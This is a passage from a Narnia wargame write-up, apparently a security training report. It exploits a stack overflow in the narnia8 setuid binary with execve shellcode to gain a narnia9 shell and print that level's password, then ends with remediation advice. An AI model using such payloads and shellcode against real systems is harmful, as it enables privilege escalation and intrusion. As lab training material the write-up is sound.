class="c3">&nbsp;&lt;+</span><span class="c8">23</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">add</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">esp</span><span class="c3">,</span><span class="c8">0x4</span><span class="c3"><br> &nbsp; </span><span class="c8">0x080484aa</span><span class="c3">&nbsp;&lt;+</span><span class="c8">26</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">jmp</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">0x80484bf</span><span class="c3">&nbsp;&lt;main+</span><span class="c8">47</span><span class="c3">&gt;<br> &nbsp; </span><span class="c8">0x080484ac</span><span class="c3">&nbsp;&lt;+</span><span class="c8">28</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">mov</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">eax</span><span class="c3">,</span><span class="c8">DWORD</span><span class="c3">&nbsp;</span><span class="c8">PTR</span><span class="c3">&nbsp;[</span><span class="c8">ebp</span><span class="c3">+</span><span class="c8">0xc</span><span class="c3">]<br> &nbsp; </span><span class="c8">0x080484af</span><span class="c3">&nbsp;&lt;+</span><span class="c8">31</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">mov</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">eax</span><span class="c3">,</span><span class="c8">DWORD</span><span class="c3">&nbsp;</span><span class="c8">PTR</span><span class="c3">&nbsp;[</span><span class="c8">eax</span><span class="c3">]<br> &nbsp; </span><span class="c8">0x080484b1</span><span class="c3">&nbsp;&lt;+</span><span class="c8">33</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">push</span><span class="c3">&nbsp; &nbsp;</span><span class="c8">eax</span><span class="c3"><br> &nbsp; </span><span class="c8">0x080484b2</span><span class="c3">&nbsp;&lt;+</span><span class="c8">34</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">push</span><span class="c3">&nbsp; &nbsp;</span><span class="c8">0x8048554</span><span class="c3"><br> &nbsp; </span><span class="c8">0x080484b7</span><span class="c3">&nbsp;&lt;+</span><span class="c8">39</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">call</span><span class="c3">&nbsp; &nbsp;</span><span class="c8">0x80482e0</span><span class="c3">&nbsp;&lt;printf@plt&gt;<br> &nbsp; </span><span class="c8">0x080484bc</span><span class="c3">&nbsp;&lt;+</span><span class="c8">44</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">add</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">esp</span><span class="c3">,</span><span class="c8">0x8</span><span class="c3"><br> &nbsp; </span><span class="c8">0x080484bf</span><span class="c3">&nbsp;&lt;+</span><span class="c8">47</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">mov</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">eax</span><span class="c3">,</span><span class="c8">0x0</span><span class="c3"><br> &nbsp; </span><span class="c8">0x080484c4</span><span class="c3">&nbsp;&lt;+</span><span class="c8">52</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">leave</span><span class="c3">&nbsp; <br> &nbsp; </span><span class="c8">0x080484c5</span><span class="c3">&nbsp;&lt;+</span><span class="c8">53</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">ret</span><span class="c3">&nbsp; &nbsp; <br>End of assembler dump.</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span>Note that </span><span class="c27">main+23</span><span>&nbsp;comes right after the call to func. Therefore, if we overwrite this return address of func to the address of the shellcode (just as we did in </span><span class="c38"><a class="c14" href="#h.e4mp3rcoeyar">Narnia 2</a></span><span>&nbsp;and </span><span class="c38"><a class="c14" href="#h.125dslwuwfyp">Narnia 4</a></span><span>), then the shellcode will be executed consequently giving a shell as the narnia9 user. </span></p><h4 class="c21" id="h.7l78l8n3eh28"><span class="c16">Shellcode</span></h4><p class="c0"><span class="c2">Now on the target machine, we can run the narnia8 binary with an input of 20 A&rsquo;s and pipe it over to xxd to get the address of local_8:</span></p><a id="t.b1f252fb1a505acfe699e10db00484b02a492016"></a><a id="t.97"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia8@narnia:/narnia$ ./narnia8 $(python -c &quot;print &#39;</span><span class="c6">A</span><span class="c3">&#39;*</span><span class="c8">20</span><span class="c3">&quot;)|xxd &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br></span><span class="c8">00000000</span><span class="c3">: </span><span class="c8">4141 4141</span><span class="c3">&nbsp;</span><span class="c8">4141 4141</span><span class="c3">&nbsp;</span><span class="c8">4141 4141</span><span class="c3">&nbsp;</span><span class="c8">4141 4141</span><span class="c3">&nbsp; AAAAAAAAAAAAAAAA &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br></span><span class="c8">00000010</span><span class="c3">: </span><span class="c8">4141 4141</span><span class="c3">&nbsp;d1d7 ffff e8d5 ffff a</span><span class="c8">784 0408</span><span class="c3">&nbsp; </span><span class="c6">AAAA</span><span class="c3">............ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">00000020</span><span class="c3">: d1d7 ffff </span><span class="c8">0</span><span class="c3">a &nbsp;</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span>Here we can see that local_8 is located at 0xffffd7d1. Subtracting this address by 4 bytes (local_8c address) + 4 bytes (junk) + 4 bytes (shellcode address) + 33 bytes (shellcode</span><sup><a href="#ftnt13" id="ftnt_ref13">[13]</a></sup><span>), we get the local_8 address as </span><span class="c8">0xffffd7a4</span><span class="c2">:</span></p><a id="t.af1cdf6e9cde343c4846c0b121296335e04d07ff"></a><a id="t.98"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">&gt;&gt;&gt; hex(</span><span class="c8">0xffffd7d1</span><span class="c3">-(</span><span class="c8">4</span><span class="c3">+</span><span class="c8">4</span><span class="c3">+</span><span class="c8">4+33</span><span class="c3">))<br>&#39;</span><span class="c8">0xffffd7a4</span><span class="c3">&#39;</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">To calculate the address of the shellcode, we add 20 to the local_8 address to account for 20 A&rsquo;s + 4 (address of local_8) + 4 (junk) + 4 (address of shellcode):</span></p><a id="t.ef71f7eb473cc9629d5611fce34afc70e8033a1f"></a><a id="t.99"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">&gt;&gt;&gt; hex(</span><span class="c8">0xffffd7a4</span><span class="c3">+</span><span class="c8">20</span><span class="c3">+</span><span class="c8">4</span><span class="c3">+</span><span class="c8">4</span><span class="c3">+</span><span class="c8">4</span><span class="c3">)<br>&#39;</span><span class="c8">0xffffd7c4</span><span class="c3">&#39;</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span>Therefore, the address of the shellcode is at </span><span class="c8">0xffffd7c4</span><span class="c2">. Finally, the payload can be passed as the argument:</span></p><a id="t.0bd93db9fb8274c9f04b1553cfaff29bec4ae692"></a><a id="t.100"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia8@narnia:/narnia$ ./narnia8 $(python -c &quot;print &#39;A&#39;*20+&#39;</span><span class="c11">\x</span><span class="c3">a4</span><span class="c11">\x</span><span class="c3">d7</span><span class="c11">\x</span><span class="c3">ff</span><span class="c11">\x</span><span class="c3">ff&#39;+&#39;</span><span class="c11">\x</span><span class="c3">90&#39;*<br>4+&#39;</span><span class="c11">\x</span><span class="c3">c4</span><span class="c11">\x</span><span class="c3">d7</span><span class="c11">\x</span><span class="c3">ff</span><span class="c11">\x</span><span class="c3">ff&#39;+&#39;</span><span class="c11">\x</span><span class="c3">6a</span><span class="c11">\x</span><span class="c3">0b</span><span class="c11">\x</span><span class="c3">58</span><span class="c11">\x</span><span class="c3">99</span><span class="c11">\x</span><span class="c3">52</span><span class="c11">\x</span><span class="c3">66</span><span class="c11">\x</span><span class="c3">68</span><span class="c11">\x</span><span class="c3">2d</span><span class="c11">\x</span><span class="c3">70</span><span class="c11">\x</span><span class="c3">89</span><span class="c11">\x</span><span class="c3">e1</span><span class="c11">\x</span><span class="c3">52</span><span class="c11">\x</span><span class="c3">6a</span><span class="c11">\x</span><span class="c3">68</span><span class="c11">\x</span><span class="c3">68</span><span class="c11">\x</span><span class="c3">2f<br></span><span class="c11">\x</span><span class="c3">62</span><span class="c11">\x</span><span class="c3">61</span><span class="c11">\x</span><span class="c3">73</span><span class="c11">\x</span><span class="c3">68</span><span class="c11">\x</span><span class="c3">2f</span><span class="c11">\x</span><span class="c3">62</span><span class="c11">\x</span><span class="c3">69</span><span class="c11">\x</span><span class="c3">6e</span><span class="c11">\x</span><span class="c3">89</span><span class="c11">\x</span><span class="c3">e3</span><span class="c11">\x</span><span class="c3">52</span><span class="c11">\x</span><span class="c3">51</span><span class="c11">\x</span><span class="c3">53</span><span class="c11">\x</span><span class="c3">89</span><span class="c11">\x</span><span class="c3">e1</span><span class="c11">\x</span><span class="c3">cd</span><span class="c11">\x</span><span class="c3">80&#39;&quot;) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>AAAAAAAAAAAAAAAAAAAAj<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; XRfh-pRjhh/bash/binRQS<br>bash-4.4$ whoami<br>narnia9<br>bash-4.4$ cat /etc/narnia_pass/narnia9<br>eiL5fealae</span></p></td></tr></table><h3 class="c10" id="h.kxnobi7dhgec"><span class="c5">Source Code</span></h3><a id="t.e2acc3a90eb7d3586dda981bb496bff7c8733c24"></a><a id="t.101"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c8">#include &lt;stdio.h&gt;</span><span class="c3"><br></span><span class="c8">#include &lt;stdlib.h&gt;</span><span class="c3"><br></span><span class="c8">#include &lt;string.h&gt;</span><span class="c3"><br></span><span class="c39">// gcc&#39;s variable reordering messed things up</span><span class="c3"><br></span><span class="c39">// to keep the level in its old style i am</span><span class="c3"><br></span><span class="c39">// making &quot;i&quot; global until i find a fix</span><span class="c3"><br></span><span class="c39">// -morla</span><span class="c3"><br></span><span class="c6">int</span><span class="c3">&nbsp;i;<br><br></span><span class="c6">void</span><span class="c3">&nbsp;</span><span class="c4">func</span><span class="c8">(</span><span class="c6">char</span><span class="c8">&nbsp;*b)</span><span class="c3">{<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c6">char</span><span class="c3">&nbsp;*blah=b;<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c6">char</span><span class="c3">&nbsp;bok[</span><span class="c8">20</span><span class="c3">];<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c39">//int i=0;</span><span class="c3"><br><br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">memset</span><span class="c3">(bok, </span><span class="c11">&#39;\0&#39;</span><span class="c3">, </span><span class="c6">sizeof</span><span class="c3">(bok));<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c6">for</span><span class="c3">(i=</span><span class="c8">0</span><span class="c3">; blah[i] != </span><span class="c11">&#39;\0&#39;</span><span class="c3">; i++)<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;bok[i]=blah[i];<br><br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;%s\n&quot;</span><span class="c3">,bok);<br>}<br><br></span><span class="c6">int</span><span class="c3">&nbsp;</span><span class="c4">main</span><span class="c8">(</span><span class="c6">int</span><span class="c8">&nbsp;argc, </span><span class="c6">char</span><span class="c8">&nbsp;**argv)</span><span class="c3">{<br><br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c6">if</span><span class="c3">(argc &gt; </span><span class="c8">1</span><span class="c3">)<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;func(argv[</span><span class="c8">1</span><span class="c3">]);<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c6">else</span><span class="c3"><br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;%s argument\n&quot;</span><span class="c3">, argv[</span><span class="c8">0</span><span class="c3">]);<br><br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c6">return</span><span class="c3">&nbsp;</span><span class="c8">0</span><span class="c3">;<br>}</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">Looking at the code, the assumption that the while loop in func found by Ghidra is actually a for loop proved to be correct.</span></p><p class="c0 c29"><span class="c2"></span></p><p class="c0 c29"><span class="c2"></span></p><p class="c0 c29"><span class="c2"></span></p><h1 class="c10" id="h.susjdnco5e24"><span class="c49 c46 c36 c62">Conclusion</span></h1><hr><p class="c0 c29"><span class="c2"></span></p><p class="c0 c29"><span class="c2"></span></p><p class="c0"><span class="c2">Binaries with setuid permissions must be carefully examined before other users are given execute permissions. Every binary was vulnerable to exploitation using well-known techniques, among them being re2libc, format string exploitation, and shellcode injection. The following remediations will strengthen the security of every tested binary:</span></p><p class="c0 c29"><span class="c2"></span></p><ul class="c42 lst-kix_dokz9fyws9pt-0 start"><li class="c0 c66 li-bullet-0"><span class="c2">Perform boundary checks before passing user input into functions</span></li></ul><ul class="c42 lst-kix_dokz9fyws9pt-1 start"><li class="c0 c9 li-bullet-0"><span class="c2">Almost every binary outlined in this report was vulnerable due to failure of checking boundaries</span></li><li class="c0 c9 li-bullet-0"><span class="c2">Sensitive memory addresses were overwritten allowing ret2libc among other attacks</span></li></ul><ul class="c42 lst-kix_dokz9fyws9pt-0"><li class="c0 c66 li-bullet-0"><span class="c2">Unnecessary disabling NX bit</span></li></ul><ul class="c42 lst-kix_dokz9fyws9pt-1 start"><li class="c0 c9 li-bullet-0"><span class="c2">The NX bit was unnecessarily disabled for multiple binaries resulting in shellcode injection</span></li></ul><ul class="c42 lst-kix_dokz9fyws9pt-0"><li class="c0 c66 li-bullet-0"><span class="c2">Untrusted user input was directly passed to functions</span></li></ul><ul class="c42 lst-kix_dokz9fyws9pt-1 start"><li class="c0 c9 li-bullet-0"><span>Two out of nine binaries (namely </span><span class="c38"><a class="c14" href="#h.n6g8yeh9n8qz">Narnia 5</a></span><span>&nbsp;and </span><span class="c38"><a class="c14" href="#h.v80flpijk1ef">Narnia 7</a></span><span>) passed unsanitized user input directly to snprintf without boundary checks</span></li></ul><p class="c0 c29"><span class="c2"></span></p><p class="c0"><span class="c2">SETUID permissions for every binary tested in this report should be removed immediately until the remediations outlined above are observed.</span></p><p class="c0 c29"><span class="c2"></span></p><p class="c0 c29"><span class="c2"></span></p><p class="c0 c29"><span class="c2"></span></p><div><p class="c29 c64"><span class="c87 c49 c31 c46 c36"></span></p></div><hr class="c69"><div><p class="c32"><a href="#ftnt_ref1" id="ftnt1">[1]</a><span class="c31">&nbsp;</span><span class="c38 c31"><a class="c14" href="https://www.google.com/url?q=https://github.com/pwndbg/pwndbg&amp;sa=D&amp;source=editors&amp;ust=1653862984872073&amp;usg=AOvVaw07wgHBOn_f2dXgmrpnyRoj">https://github.com/pwndbg/pwndbg</a></span><span class="c15">&nbsp;</span></p></div><div><p class="c32"><a href="#ftnt_ref2" id="ftnt2">[2]</a><span class="c31">&nbsp;</span><span class="c38 c31"><a class="c14" href="https://www.google.com/url?q=https://ghidra-sre.org/&amp;sa=D&amp;source=editors&amp;ust=1653862984872392&amp;usg=AOvVaw0msoGRWifjfkM2dp4THiuH">https://ghidra-sre.org/</a></span><span class="c15">&nbsp;</span></p></div><div><p class="c32"><a href="#ftnt_ref3" id="ftnt3">[3]</a><span class="c31">&nbsp;</span><span class="c38 c31"><a class="c14" href="https://www.google.com/url?q=https://owasp.org/www-community/attacks/Buffer_Overflow_via_Environment_Variables&amp;sa=D&amp;source=editors&amp;ust=1653862984868000&amp;usg=AOvVaw2QXKRmYG3aCVGXK9-bV6HA">https://owasp.org/www-community/attacks/Buffer_Overflow_via_Environment_Variables</a></span><span class="c15">&nbsp;</span></p></div><div><p class="c32"><a href="#ftnt_ref4" id="ftnt4">[4]</a><span class="c31">&nbsp;</span><span class="c38 c31"><a class="c14" href="https://www.google.com/url?q=https://www.tutorialspoint.com/c_standard_library/c_function_getenv.htm&amp;sa=D&amp;source=editors&amp;ust=1653862984868560&amp;usg=AOvVaw27HBGXaqv75-J9BA1A50Uo">https://www.tutorialspoint.com/c_standard_library/c_function_getenv.htm</a></span><span class="c15">&nbsp;</span></p></div><div><p class="c32"><a href="#ftnt_ref5" id="ftnt5">[5]</a><span class="c31">&nbsp;</span><span class="c38 c31"><a class="c14" href="https://www.google.com/url?q=http://shell-storm.org/shellcode/files/shellcode-827.php&amp;sa=D&amp;source=editors&amp;ust=1653862984868922&amp;usg=AOvVaw2itnxCU_tXAxYbyR6QWgBV">http://shell-storm.org/shellcode/files/shellcode-827.php</a></span><span class="c15">&nbsp;</span></p></div><div><p class="c32"><a href="#ftnt_ref6" id="ftnt6">[6]</a><span class="c31">&nbsp;</span><span class="c38 c31"><a class="c14" href="https://www.google.com/url?q=http://shell-storm.org/shellcode/files/shellcode-606.php&amp;sa=D&amp;source=editors&amp;ust=1653862984869310&amp;usg=AOvVaw1C3u0fG8sz2m8SbTL12HTG">http://shell-storm.org/shellcode/files/shellcode-606.php</a></span><span class="c15">&nbsp;</span></p></div><div><p class="c32"><a href="#ftnt_ref7" id="ftnt7">[7]</a><span class="c15">&nbsp;https://avinetworks.com/wp-content/uploads/2020/06/buffer-overflow-diagram.png </span></p></div><div><p class="c32"><a href="#ftnt_ref8" id="ftnt8">[8]</a><span class="c31">&nbsp;</span><span class="c38 c31"><a class="c14" href="https://www.google.com/url?q=https://i.stack.imgur.com/Ewkn1.png&amp;sa=D&amp;source=editors&amp;ust=1653862984869804&amp;usg=AOvVaw1-DA48hDTfj3VQfoFpmDb3">https://i.stack.imgur.com/Ewkn1.png</a></span><span class="c15">&nbsp;</span></p></div><div><p class="c32"><a href="#ftnt_ref9" id="ftnt9">[9]</a><span class="c31">&nbsp;</span><span class="c38 c31"><a class="c14" href="https://www.google.com/url?q=http://shell-storm.org/shellcode/files/shellcode-606.php&amp;sa=D&amp;source=editors&amp;ust=1653862984870174&amp;usg=AOvVaw0AWM8H_FYxkGL7Ab1eHwsm">http://shell-storm.org/shellcode/files/shellcode-606.php</a></span></p></div><div><p class="c32"><a href="#ftnt_ref10" id="ftnt10">[10]</a><span class="c31">&nbsp;</span><span class="c38 c31"><a class="c14" href="https://www.google.com/url?q=https://en.wikipedia.org/wiki/Bounds_checking&amp;sa=D&amp;source=editors&amp;ust=1653862984870513&amp;usg=AOvVaw2rvnaJcDa4du8_0Pqy9hzf">https://en.wikipedia.org/wiki/Bounds_checking</a></span><span class="c15">&nbsp;</span></p></div><div><p class="c32"><a href="#ftnt_ref11" id="ftnt11">[11]</a><span class="c31">&nbsp;</span><span class="c38 c31"><a class="c14" href="https://www.google.com/url?q=https://stackoverflow.com/questions/1270387/are-snprintf-and-friends-safe-to-use%23:~:text%3DIt%2520is%2520safe%2520as%2520you,correct%2520length%2520for%2520the%2520buffer.%26text%3Dsnprintf%2520does%2520guarantee%2520that%2520the,does%2520not%2520guarantee%2520null%252Dtermination&amp;sa=D&amp;source=editors&amp;ust=1653862984870947&amp;usg=AOvVaw1pKYSTNQoLdc42xOB6VMYF">https://stackoverflow.com/questions/1270387/are-snprintf-and-friends-safe-to-use#:~:text=It%20is%20safe%20as%20you,correct%20length%20for%20the%20buffer.&amp;text=snprintf%20does%20guarantee%20that%20the,does%20not%20guarantee%20null%2Dtermination</a></span><span class="c15">. </span></p></div><div><p class="c32"><a href="#ftnt_ref12" id="ftnt12">[12]</a><span class="c31">&nbsp;</span><span class="c38 c31"><a class="c14" href="https://www.google.com/url?q=https://en.wikipedia.org/wiki/Return-to-libc_attack&amp;sa=D&amp;source=editors&amp;ust=1653862984871326&amp;usg=AOvVaw2gnWXzZHxixH18eYFpck_3">https://en.wikipedia.org/wiki/Return-to-libc_attack</a></span><span class="c15">&nbsp;</span></p></div><div><p class="c32"><a href="#ftnt_ref13" id="ftnt13">[13]</a><span class="c31">&nbsp;</span><span class="c38 c31"><a class="c14" href="https://www.google.com/url?q=http://shell-storm.org/shellcode/files/shellcode-606.php&amp;sa=D&amp;source=editors&amp;ust=1653862984871694&amp;usg=AOvVaw1O3ARlZIEGI0_71Bi_8KYU">http://shell-storm.org/shellcode/files/shellcode-606.php</a></span><span class="c15">&nbsp;</span></p></div></body></html>